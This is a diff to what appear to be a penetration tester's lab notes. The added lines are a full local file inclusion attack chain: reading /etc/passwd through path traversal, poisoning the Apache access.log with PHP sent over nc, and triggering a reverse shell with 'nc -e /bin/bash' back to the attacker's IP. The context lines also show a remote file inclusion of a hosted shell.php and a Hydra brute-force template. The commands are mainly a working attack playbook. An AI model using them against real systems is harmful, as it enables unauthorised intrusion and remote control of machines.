@@ -66,6 +66,23 @@ $exec = system('reverse.exe', $val);
 	 - nc -lnvp 443
 	 - curl http://192.168.213.53:8080/site/index.php?page=http://192.168.49.213/shell.php
 	Note: If method 1 fails at the last step, use the 2nd method to execute the exe file.
+	
+	
+Another LFI Method: (https://soolascybersecurity.com/2022/02/21/solstice-not-happy-jan/)
+
+- PROVING LFI EXISTS: curl 192.168.238.72:8593?book=../../../../../etc/passwd
+ 
+- TEST ITS PRESENCE: curl 192.168.238.72:8593?book=../../../../../var/log/apache2/access.log 
+ 
+- ECHO THE COMMAND USING NC TO ACCESS.LOG: echo "GET <?php echo 'TEST123' ?> HTTP/1.1" | nc 192.168.238.72 80 
+ 
+- TESTING IF COMMAND EXISTS ON ACCESS.LOG: curl 192.168.238.72:8593?book=../../../../../var/log/apache2/access.log
+ 
+- REVERSE SHELL: echo "GET <?php system('nc -e /bin/bash 192.168.49.238 9001'); ?> HTTP/1.1" | nc 192.168.238.72 80 ()
+ 
+curl 192.168.238.72:8593?book=../../../../../var/log/apache2/access.log (TRIGGERING REVERSE SHELL)
+
+
 Hydra: 
 	- How to brute force a login page
 		- sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
